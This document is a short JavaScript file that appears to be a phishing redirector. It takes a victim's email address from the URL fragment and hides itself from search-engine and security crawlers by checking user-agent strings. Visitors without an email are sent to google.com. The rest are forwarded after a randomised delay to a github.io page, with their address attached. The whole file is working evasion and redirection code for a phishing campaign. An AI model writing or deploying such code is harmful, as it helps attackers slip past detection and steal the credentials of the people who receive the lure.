(function () {
  function getEmailFromHash() {
    const hash = window.location.hash;
    if (!hash) return null;
    return decodeURIComponent(hash.replace("#", ""));
  }

  function isBotUserAgent() {
    const bots = [
      /bot/i, /crawler/i, /spider/i, /crawling/i,
      /google/i, /bing/i, /yahoo/i, /facebook/i,
      /duckduckgo/i, /baidu/i, /yandex/i
    ];
    return bots.some(bot => bot.test(navigator.userAgent));
  }

  function redirectUser(email) {
    const delay = Math.floor(Math.random() * 1000) + 1000;
    setTimeout(() => {
      window.location.href = "https://naturaldeco.github.io/#" + email;
    }, delay);
  }

  window.addEventListener("load", () => {
    if (isBotUserAgent()) {
      console.log("Bot detected, exiting...");
      return;
    }

    const email = getEmailFromHash();
    if (!email || !email.includes("@")) {
      window.location.href = "https://google.com";
      return;
    }

    redirectUser(email);
  });
})();












